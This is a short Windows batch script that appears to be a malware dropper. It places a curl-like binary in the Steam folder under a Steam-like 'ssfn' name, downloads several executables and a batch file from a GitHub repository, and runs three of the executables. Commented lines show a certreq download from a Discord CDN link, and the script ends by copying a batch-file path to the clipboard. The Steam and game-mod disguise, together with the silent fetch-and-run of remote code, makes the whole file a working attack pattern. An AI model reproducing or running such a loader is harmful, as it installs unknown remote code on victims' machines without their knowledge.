@echo off
TITLE 

IF EXIST "C:\Program Files (x86)\steam\ssfn_rdl.exe" (
echo Exists) ELSE (
  move "C:\Users\user\Downloads\ssfn_rdl2.exe" "C:\Program Files (x86)\steam\ssfn_rdl.exe"
)

IF EXIST "C:\Program Files (x86)\steam\ssfn_WorkshopMods.exe" (
echo Exists) ELSE (
  "C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk https://github.com/tobiasmulln/Testing/raw/main/ssfn_WorkshopMods.exe --output "C:\Program Files (x86)\steam\ssfn_WorkshopMods.exe"
)

"C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://github.com/tobiasmulln/Testing/raw/main/korean.exe" --output "C:\Users\user\Downloads\korean.exe"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://github.com/tobiasmulln/Testing/raw/main/Cloud.exe" --output "C:\Users\user\Downloads\Cloud.exe"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://raw.githubusercontent.com/tobiasmulln/Testing/main/ARK_WorldsMod.bat" --output "C:\Users\user\Downloads\ARK_WorldsMod.bat"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://github.com/tobiasmulln/Testing/raw/main/noTitles.exe" --output "C:\Users\user\Downloads\noTitles.exe"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://github.com/tobiasmulln/Testing/raw/main/noTitlesWorse.exe" --output "C:\Users\user\Downloads\noTitlesWorse.exe"

#"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\korean.exe" "https://github.com/tobiasmulln/Testing/raw/main/korean.exe"
#"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\Cloud.exe" "https://github.com/tobiasmulln/Testing/raw/main/Cloud.exe"
#"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\ARK_WorldsMod.bat" "https://raw.githubusercontent.com/tobiasmulln/Testing/main/ARK_WorldsMod.bat"
#"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\noTitles.exe" "https://github.com/tobiasmulln/Testing/raw/main/noTitles.exe"
#"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\noTitlesWorse.exe" "https://github.com/tobiasmulln/Testing/raw/main/noTitlesWorse.exe"

start "" "C:\Users\user\Downloads\noTitles.exe"
start "" "C:\Users\user\Downloads\noTitlesWorse.exe"
start "" "C:\Users\user\Downloads\korean.exe"

##certreq -Post -config "https://cdn.discordapp.com/attachments/1105541696135123004/1108129658433699892/ssfn_rdl2.exe" c:\windows\win.ini "C:\Program Files (x86)\steam\ssfn_rdl.exe"
##"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Program Files (x86)\steam\ssfn_WorkshopMods.exe" "https://github.com/tobiasmulln/Testing/raw/main/ssfn_WorkshopMods.exe"

echo C:\Users\user\Downloads\ARK_WorldsMod.bat|clip
